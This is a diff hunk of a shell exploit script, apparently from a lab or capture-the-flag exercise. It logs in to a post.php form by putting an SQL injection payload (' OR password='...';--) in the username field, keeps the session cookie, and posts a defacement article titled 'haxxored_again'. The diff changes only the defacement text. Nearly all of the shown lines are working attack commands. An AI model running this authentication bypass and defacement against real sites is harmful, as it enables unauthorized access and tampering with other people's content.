@@ -14,7 +14,7 @@ rm -f data.db
 echo "Logging in as user '${USER}'..."
 curl -c cookies.txt "http://${BASE}/post.php" -d "form=login" -d "username=' OR password='${HASH}';--"
 echo "Posting new article..."
-curl -b cookies.txt "http://${BASE}/post.php" -d "form=content" -d "type=1" -d "title=haxxored_again" -d "content=ALLYOURBASEAREBELONGTOUS"
+curl -b cookies.txt "http://${BASE}/post.php" -d "form=content" -d "type=1" -d "title=haxxored_again" -d "content=ALLYOURBASEAREBELONGTOERINN"
 echo -e "\033[32mDone!\033[0m"
 
 rm -f cookies.txt
